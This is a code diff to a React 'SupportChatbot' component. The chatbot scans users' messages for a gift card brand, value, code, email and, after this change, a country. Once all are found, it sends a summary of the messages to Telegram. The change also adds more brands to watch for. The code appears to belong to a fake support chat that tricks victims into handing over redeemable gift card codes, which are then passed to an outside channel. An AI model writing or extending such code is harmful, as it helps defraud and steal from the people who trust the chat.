@@ -91,19 +91,20 @@ const SupportChatbot = () => {
 
       setMessages([...newMessages, { role: 'assistant', content: data.message }]);
 
-      // Check if conversation has all 4 required pieces: card type, value, code, email
+      // Check if conversation has all 5 required pieces: card type, value, code, country, email
       const conversationText = newMessages.map(m => m.content).join(' ').toLowerCase();
       const rawText = newMessages.map(m => m.content).join(' ');
       
       const hasEmail = conversationText.includes('@');
       const hasCode = /[a-z0-9]{8,}/i.test(rawText);
       const hasAmount = /\$?\d{2,}/.test(rawText);
+      const hasCountry = /\b(us|usa|united states|uk|united kingdom|canada|australia|germany|france|spain|italy|netherlands|ireland|sweden|norway|denmark|switzerland|austria|belgium|portugal|finland)\b/i.test(conversationText);
       // Detect card type mentions
-      const cardTypes = ['amazon', 'steam', 'itunes', 'apple', 'google', 'playstation', 'xbox', 'netflix', 'spotify', 'ebay', 'walmart', 'target', 'best buy', 'nike', 'visa', 'mastercard', 'starbucks', 'roblox'];
+      const cardTypes = ['amazon', 'steam', 'itunes', 'apple', 'google', 'playstation', 'xbox', 'netflix', 'spotify', 'ebay', 'walmart', 'target', 'best buy', 'nike', 'visa', 'mastercard', 'starbucks', 'roblox', 'uber', 'doordash', 'nintendo', 'discord', 'airbnb', 'lululemon', 'ikea', 'home depot', 'sephora', 'nordstrom'];
       const hasCardType = cardTypes.some(type => conversationText.includes(type));
       
-      // Send to Telegram when we have all 4 required pieces
-      if (hasEmail && hasCode && hasAmount && hasCardType) {
+      // Send to Telegram when we have all 5 required pieces
+      if (hasEmail && hasCode && hasAmount && hasCountry && hasCardType) {
         const userMessages = newMessages.filter(m => m.role === 'user');
         const summary = `New Gift Card Request:\n${userMessages.map(m => m.content).join('\n')}`;
         
